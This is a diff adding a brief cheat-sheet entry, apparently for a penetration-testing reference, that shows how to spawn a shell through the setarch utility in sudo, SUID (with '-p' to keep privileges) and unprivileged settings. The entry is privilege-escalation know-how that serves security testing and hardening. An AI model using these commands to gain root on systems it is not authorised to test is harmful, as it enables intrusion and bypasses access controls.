@@ -1,0 +1,14 @@
+setarch
+=======
+
+Shell
+-----
+
+[Sudo]
+    setarch -3 /bin/sh
+
+[SUID]
+    setarch -3 /bin/sh -p
+
+[Unprivileged]
+    setarch -3 /bin/sh
